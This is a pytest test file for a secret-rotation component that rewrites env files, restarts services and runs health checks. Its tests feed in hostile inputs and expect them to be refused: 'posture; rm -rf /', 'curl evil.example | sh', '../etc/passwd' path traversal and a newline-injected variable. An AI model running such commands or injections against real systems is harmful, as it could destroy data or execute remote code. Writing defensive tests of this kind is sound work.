"""The host consumer (soc_api.rotate.consumer): the env file, the service, the health check."""

import os
import stat
import subprocess
from pathlib import Path
from typing import Any

import pytest

from soc_api.rotate import consumer
from soc_api.rotate.consumer import CHECKS, HostConsumer
from soc_api.rotate.keys import SUPPORTED_CHECKS
from soc_api.rotate.net import RotateError
from soc_api.rotate.rights import Secret

OLD = "OLDKEYVALUE-aaaaaaaaaaaa"
NEW = "NEWKEYVALUE-bbbbbbbbbbbb"
ORG = "SOC_POSTURE_LC_OID=01234567-89ab-cdef-0123-456789abcdef"
ENV_TEXT = f"SOC_POSTURE_LC_KEY={OLD}\n{ORG}\n"
COMPOSE = Path("/opt/soc-platform/deploy/soc-compose.sh")


class FakeRun:
    """Stands in for subprocess.run: records argv and options, answers from a list."""

    def __init__(self, *codes: Any) -> None:
        self.codes = list(codes)
        self.calls: list[tuple[list[str], dict[str, Any]]] = []

    def __call__(self, argv: list[str], **kw: Any) -> Any:
        self.calls.append((argv, kw))
        code = self.codes.pop(0) if self.codes else 0
        if isinstance(code, Exception):
            raise code
        return subprocess.CompletedProcess(argv, code, b"", b"")


@pytest.fixture
def root(tmp_path: Path) -> Path:
    (tmp_path / "env").mkdir()
    path = tmp_path / "env" / "posture-lc.env"
    path.write_text(ENV_TEXT)
    path.chmod(0o600)
    return tmp_path


def make(
    root: Path, run: FakeRun | None = None, environ: dict[str, str] | None = None
) -> HostConsumer:
    return HostConsumer(root, COMPOSE, run=run or FakeRun(), environ=environ or {})


# ---- the env file ----


def test_only_the_one_variable_changes_and_the_rest_is_kept_byte_for_byte(root: Path) -> None:
    make(root).install("env/posture-lc.env", "SOC_POSTURE_LC_KEY", Secret(NEW))
    assert (root / "env" / "posture-lc.env").read_text() == f"SOC_POSTURE_LC_KEY={NEW}\n{ORG}\n"


def test_the_old_file_is_kept_as_prev_with_the_same_mode_and_nothing_else_is_left(
    root: Path,
) -> None:
    make(root).install("env/posture-lc.env", "SOC_POSTURE_LC_KEY", Secret(NEW))
    env = root / "env"
    assert (env / "posture-lc.env.prev").read_text() == ENV_TEXT
    for name in ("posture-lc.env", "posture-lc.env.prev"):
        assert stat.S_IMODE((env / name).stat().st_mode) == 0o600
    assert sorted(p.name for p in env.iterdir()) == ["posture-lc.env", "posture-lc.env.prev"]


def test_restore_puts_the_old_file_back_and_discard_removes_the_copy(root: Path) -> None:
    c = make(root)
    c.install("env/posture-lc.env", "SOC_POSTURE_LC_KEY", Secret(NEW))
    c.restore("env/posture-lc.env")
    assert (root / "env" / "posture-lc.env").read_text() == ENV_TEXT
    assert not (root / "env" / "posture-lc.env.prev").exists()
    c.install("env/posture-lc.env", "SOC_POSTURE_LC_KEY", Secret(NEW))
    c.discard_prev("env/posture-lc.env")
    assert not (root / "env" / "posture-lc.env.prev").exists()
    assert NEW in (root / "env" / "posture-lc.env").read_text()


@pytest.mark.parametrize(
    ("var", "value", "code"),
    [
        ("SOC_MISSING_VAR", NEW, "env_var_missing"),
        ("SOC_POSTURE_LC_KEY", "short", "bad_value"),
        ("SOC_POSTURE_LC_KEY", NEW + "\nSOC_EVIL=1", "bad_value"),
        ("SOC_POSTURE_LC_KEY", NEW + " x", "bad_value"),
        ("lower_case", NEW, "bad_value"),
    ],
)
def test_a_value_or_variable_that_is_wrong_is_refused_and_nothing_is_written(
    root: Path, var: str, value: str, code: str
) -> None:
    with pytest.raises(RotateError) as exc:
        make(root).install("env/posture-lc.env", var, Secret(value))
    assert exc.value.code == code
    assert (root / "env" / "posture-lc.env").read_text() == ENV_TEXT
    assert [p.name for p in (root / "env").iterdir()] == ["posture-lc.env"]


def test_a_variable_that_appears_twice_is_refused(root: Path) -> None:
    (root / "env" / "posture-lc.env").write_text(ENV_TEXT + f"SOC_POSTURE_LC_KEY={OLD}\n")
    with pytest.raises(RotateError, match="env_var_twice"):
        make(root).install("env/posture-lc.env", "SOC_POSTURE_LC_KEY", Secret(NEW))


def test_a_leftover_prev_from_a_failed_run_is_never_overwritten(root: Path) -> None:
    (root / "env" / "posture-lc.env.prev").write_text("a human should look at this\n")
    with pytest.raises(RotateError, match="prev_exists"):
        make(root).install("env/posture-lc.env", "SOC_POSTURE_LC_KEY", Secret(NEW))
    assert (root / "env" / "posture-lc.env.prev").read_text() == "a human should look at this\n"


@pytest.mark.parametrize(
    "path", ["../etc/passwd", "env/../x.env", "/etc/passwd", "env/a b.env", "env/x.txt"]
)
def test_a_file_path_that_could_leave_the_env_folder_is_refused(root: Path, path: str) -> None:
    with pytest.raises(RotateError, match="bad_env_file"):
        make(root).install(path, "SOC_POSTURE_LC_KEY", Secret(NEW))


def test_a_missing_env_file_is_a_short_code(root: Path) -> None:
    (root / "env" / "posture-lc.env").unlink()
    with pytest.raises(RotateError, match="env_unreadable"):
        make(root).install("env/posture-lc.env", "SOC_POSTURE_LC_KEY", Secret(NEW))


def test_a_write_that_fails_part_way_leaves_the_original_whole_and_no_copy(
    root: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    def boom(*_a: object, **_k: object) -> None:
        raise OSError("disk full")

    monkeypatch.setattr(os, "replace", boom)
    with pytest.raises(RotateError, match="env_write_failed"):
        make(root).install("env/posture-lc.env", "SOC_POSTURE_LC_KEY", Secret(NEW))
    monkeypatch.undo()
    assert (root / "env" / "posture-lc.env").read_text() == ENV_TEXT
    assert [p.name for p in (root / "env").iterdir()] == ["posture-lc.env"]


def test_restoring_without_a_copy_is_a_short_code(root: Path) -> None:
    with pytest.raises(RotateError, match="restore_failed"):
        make(root).restore("env/posture-lc.env")


# ---- the service and its check ----


def test_a_service_is_recreated_not_just_restarted_with_a_fixed_command(root: Path) -> None:
    run = FakeRun(0)
    make(root, run).restart(["posture"])
    argv, _ = run.calls[0]
    assert argv == [str(COMPOSE), "up", "-d", "--force-recreate", "--no-deps", "posture"]


def test_a_failed_or_missing_restart_is_a_short_code(root: Path) -> None:
    with pytest.raises(RotateError, match="restart_failed"):
        make(root, FakeRun(1)).restart(["posture"])
    with pytest.raises(RotateError, match="restart_failed"):
        make(root, FakeRun(subprocess.TimeoutExpired("x", 1))).restart(["posture"])
    with pytest.raises(RotateError, match="cannot_run"):
        make(root, FakeRun(FileNotFoundError())).restart(["posture"])
    with pytest.raises(RotateError, match="bad_service"):
        make(root, FakeRun()).restart(["posture; rm -rf /"])


def test_the_named_check_runs_a_fixed_command_in_its_service(root: Path) -> None:
    run = FakeRun(0, 1)
    c = make(root, run)
    assert c.check("posture_check") is True
    assert c.check("posture_check") is False
    argv, _ = run.calls[0]
    assert argv == [
        str(COMPOSE),
        "run",
        "--rm",
        "-T",
        "posture",
        "python",
        "-m",
        "soc_api.posture",
        "check",
    ]


def test_a_check_that_hangs_counts_as_failed_and_an_unknown_check_is_refused(root: Path) -> None:
    assert make(root, FakeRun(subprocess.TimeoutExpired("x", 1))).check("posture_check") is False
    with pytest.raises(RotateError, match="no_such_check"):
        make(root).check("curl evil.example | sh")


def test_children_get_no_stdin_no_output_and_a_minimal_environment(root: Path) -> None:
    run = FakeRun(0)
    environ = {
        "PATH": "/usr/bin",
        "HOME": "/root",
        "SOC_STATE_DIR": "/srv/soc",
        "LC_ROTATOR_KEY": "must-not-be-passed",
        "SECRETS_CLIENT_SECRET": "must-not-be-passed",
        "SOMETHING_ELSE": "x",
    }
    make(root, run, environ).check("posture_check")
    _, kw = run.calls[0]
    assert kw["stdin"] == subprocess.DEVNULL  # the rights came in on stdin; a child cannot read it
    assert kw["capture_output"] is True and kw["check"] is False
    assert kw["env"] == {"PATH": "/usr/bin", "HOME": "/root", "SOC_STATE_DIR": "/srv/soc"}


def test_the_checks_this_build_runs_are_exactly_the_ones_a_key_file_may_name() -> None:
    assert set(CHECKS) == set(SUPPORTED_CHECKS)
    assert consumer.VALUE_RE.fullmatch(NEW)
